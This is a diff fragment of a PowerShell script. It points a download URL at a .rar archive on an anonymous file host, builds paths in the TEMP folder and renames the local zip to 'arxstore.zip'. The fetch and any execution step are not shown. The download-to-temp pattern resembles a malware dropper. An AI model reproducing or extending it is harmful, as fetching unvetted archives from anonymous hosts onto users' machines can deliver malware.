@@ -1,6 +1,6 @@
 $zipUrl = "https://files.catbox.moe/p6somt.rar"
 $tempDir = Join-Path $env:TEMP "temp1"
-$zipPath = Join-Path $env:TEMP "temp.zip"
+$zipPath = Join-Path $env:TEMP "arxstore.zip"
 
 # สร้างโฟลเดอร์ temp
 New-Item -ItemType Directory -Force -Path $tempDir | Out-Null
